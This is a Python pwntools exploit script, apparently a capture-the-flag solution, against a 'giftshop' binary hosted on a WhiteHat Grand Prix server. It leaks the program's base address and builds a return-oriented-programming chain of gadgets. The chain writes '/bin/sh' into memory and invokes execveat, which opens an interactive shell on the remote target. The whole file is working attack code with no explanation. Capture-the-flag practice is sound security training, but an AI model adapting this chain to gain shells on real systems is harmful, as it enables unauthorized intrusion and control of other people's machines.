#!/usr/bin/env python
from pwn import *

def choose(choice):
    s.sendlineafter('choice:\n', choice)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        # s = process('./giftshop')
        s = remote('localhost', 1234)
    else:
        s = remote('pwn01.grandprix.whitehatvn.com', 26129)

    elf = ELF('./giftshop')

    s.recvuntil('!\n')
    text_base = int(s.recvline(False), 16) - 0x2030d8
    log.info('text base: %#x' % text_base)

    s.sendlineafter('??\n', 'B')
    s.sendlineafter(': \n', 'B')

    pop_rdi = 0x225f
    pop_rsi = 0x2261
    pop_rdx = 0x2265
    pop_rax = 0x2267
    syscall = 0x2254

    payload = ''
    payload += '1\0' * 4
    payload += 'A' * 0x10

    # read(0, bss, 8)
    payload += p64(text_base + pop_rax) + p64(0)
    payload += p64(text_base + pop_rdi) + p64(0)
    payload += p64(text_base + pop_rsi) + p64(text_base + elf.bss(0x500))
    payload += p64(text_base + pop_rdx) + p64(8)
    payload += p64(text_base + syscall)

    # execveat(0, "/bin/sh", NULL, NULL)
    payload += p64(text_base + pop_rax) + p64(322)
    payload += p64(text_base + pop_rdi) + p64(0)
    payload += p64(text_base + pop_rsi) + p64(text_base + elf.bss(0x500))
    payload += p64(text_base + pop_rdx) + p64(0)
    payload += p64(text_base + syscall)
    choose(payload)

    s.send('/bin/sh\0')
    s.interactive()
